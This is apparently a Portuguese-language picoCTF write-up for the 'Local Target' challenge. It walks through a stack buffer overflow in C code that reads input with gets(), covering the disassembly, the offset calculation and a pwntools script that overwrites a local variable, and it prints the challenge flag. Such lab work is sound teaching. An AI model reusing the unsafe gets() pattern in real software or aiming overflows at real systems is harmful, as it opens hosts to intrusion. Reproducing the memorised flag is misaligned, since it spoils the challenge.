# WriteUp: Local Target
## Descrição do Desafio:
Author: OverTheWire.org / LT 'syreal' Jones \
Plataforma: [PicoCTF](https://play.picoctf.org/practice/challenge/399?category=6&page=1) \
Categoria: Binary Exploitation \
Dificuldade: Média \
Descrição: 
> Smash the Stack \
> Can you overflow the buffer and modify the other local variable?

## Passo a passo da solução
### 1. Análise do arquivo fonte fornecido
Este desafio já fornece o arquivo fonte, `.c`, tornando as coisas relativamente mais fáceis.

```c
#include <stdio.h>
#include <stdlib.h>



int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}

```

Observando o código, podemos ver que ele abre a `flag` e imprime ela caso a variável `num` seja igual a 65. Podemos também notar que a variável tem seu valor atribuído logo na declaração, e não tem o valor alterado em mais nenhum local, porém outra coisa chama a atenção, logo após a declaração da variável `num` inicia um sequência de código responsável por pedir ao usuário para escrever alguma coisa na variável `input`, que tem tamanho máximo de 15 caracteres.

E é aqui que esta a vulnerabilidade, a entrada do usuário está sendo capturada pela função `gets`, que não contém nenhum limitador, logo o usuário pode escrever quantos caracteres ele quiser.

### 2. Exploit
Descobrimos que podemos facilmente estourar o buffer, agora temos que descobrir onde está a variável `num` para reescrevermos o valor dela. Essa parte podemos fazer de duas formas, a primeira é imprimir a pilha e procurar nela o valor 64 (há alguns, mas com poucas tentativas você encontraria o correto), e a segunda é olhando para o assembly, isso nos mostra o local exato da variável.

```bash 
Dump of assembler code for function main:
   0x0000000000401236 <+0>:     endbr64
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x20
   0x0000000000401242 <+12>:    mov    DWORD PTR [rbp-0x8],0x40
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdb4]        # 0x402004
   0x0000000000401250 <+26>:    mov    eax,0x0
   0x0000000000401255 <+31>:    call   0x4010f0 <printf@plt>
   0x000000000040125a <+36>:    mov    rax,QWORD PTR [rip+0x2e0f]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401261 <+43>:    mov    rdi,rax
   0x0000000000401264 <+46>:    call   0x401120 <fflush@plt>
   0x0000000000401269 <+51>:    lea    rax,[rbp-0x20]
   0x000000000040126d <+55>:    mov    rdi,rax
   0x0000000000401270 <+58>:    mov    eax,0x0
   0x0000000000401275 <+63>:    call   0x401110 <gets@plt>
=> 0x000000000040127a <+68>:    mov    edi,0xa
   0x000000000040127f <+73>:    call   0x4010c0 <putchar@plt>
   0x0000000000401284 <+78>:    mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000401287 <+81>:    mov    esi,eax
   0x0000000000401289 <+83>:    lea    rdi,[rip+0xd85]        # 0x402015
   0x0000000000401290 <+90>:    mov    eax,0x0
   0x0000000000401295 <+95>:    call   0x4010f0 <printf@plt>
```

A sequência acima é o início da função `main`, mas o que nós queremos são as instruções próximas da `printf` que imprime o valor do `num` (no caso é o último `printf`). Como o `printf` está imprimindo o valor de `num` por meio das *strings* de formato, ele deve receber o valor dela como parâmetro, e analisando as instruções antes da chamada da função, vemos duas que se destacam: `mov    eax,DWORD PTR [rbp-0x8]` e `lea    rdi,[rip+0xd85]        # 0x402015`. 

A primeira é o `num` e a segunda é a *string* inteira. Note que a instrução pega o valor do `num` subtraindo 8 do `rbp`, então nós podemos fazer a mesma coisa e descobrir a posição.

```bash
pwndbg> print $rbp - 8
$2 = (void *) 0x7fffffffdc68
```

E pronto, agora é só pegar o endereço de início da *string* e subtrair pelo valor encontrado. Como resultado descobriremos que devemos escrever 24 caracteres para chegar no `num` sendo o 25 o que vai reescrever.

### 3. Solução
A verificação no código pede para o valor de `num` ser 65 em decimal, esse número representa o caractere "A" na tabela ascii, então podemos resolver diretamente pelo terminal, ou usando um *script* simples em python.

```py
from pwn import *

p = remote(ip, porta)

payload = flat(
    b"A" * 25
)

p.sendlineafter(b": ", payload)
print(p.recvall().decode())
```

### Flag
`picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}`

## Autor
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
